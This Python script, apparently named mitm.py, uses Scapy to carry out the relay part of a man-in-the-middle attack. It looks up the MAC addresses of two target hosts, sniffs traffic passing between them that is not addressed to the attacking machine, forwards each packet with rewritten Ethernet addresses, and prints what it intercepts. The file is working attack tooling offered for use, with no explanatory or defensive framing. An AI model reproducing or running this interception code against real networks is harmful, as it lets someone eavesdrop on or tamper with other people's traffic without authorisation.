from scapy.all import *
import sys

def get_target_mac(target):
    pkt = Ether(dst = "ff:ff:ff:ff:ff:ff")
    pkt /= ARP(pdst = target)
    target_mac = ""
    while len(target_mac) == 0:
        try:
            target_mac = srp(pkt, verbose = False, timeout = 2)[0][0][1].hwsrc
        except:
            continue
    return target_mac

def relay_packet(pkt, host_1_mac, host_2_mac):
    try:
        pkt_src = pkt[0].getlayer(IP).src
        pkt_hwsrc = pkt[0].getlayer(Ether).src
        pkt_hwdst = pkt[0].getlayer(Ether).dst
        new_pkt = pkt.copy()
        new_pkt[Ether].src = pkt_hwdst
        if pkt_hwsrc == host_1_mac:
            new_pkt[Ether].dst = host_2_mac
        elif pkt_hwsrc == host_2_mac:
            new_pkt[Ether].dst = host_1_mac
        sendp(new_pkt, verbose = False)
        print(f"Intercepted: ({pkt_src:16}{pkt_hwsrc}) -> ({new_pkt[IP].dst:16}{new_pkt[Ether].dst})")
        #print(f"\t{pkt[0].summary()}")
    except:
        pass
    
def main():
    if len(sys.argv) == 3:
        my_ip = get_if_addr(conf.iface)
        host_1 = str(sys.argv[1])
        host_2 = str(sys.argv[2])
        print("Getting hosts MAC addresses...")
        host_1_mac = str(get_target_mac(host_1))
        host_2_mac = str(get_target_mac(host_2))
        sniff_filter = f"inbound and not host {my_ip} and ((host {host_1} or host {host_2}) or ((ether src {host_1_mac} or ether dst {host_1_mac}) or (ether src {host_2_mac} or ether dst {host_2_mac})))"
        print("Listening for inbound packets from hosts...")
        sniff(filter = sniff_filter, prn = lambda pkt: relay_packet(pkt, host_1_mac, host_2_mac), store = False)
    else: 
        print("Usage: python3 mitm.py <host_1> <host_2>")

if __name__=="__main__":
    main()
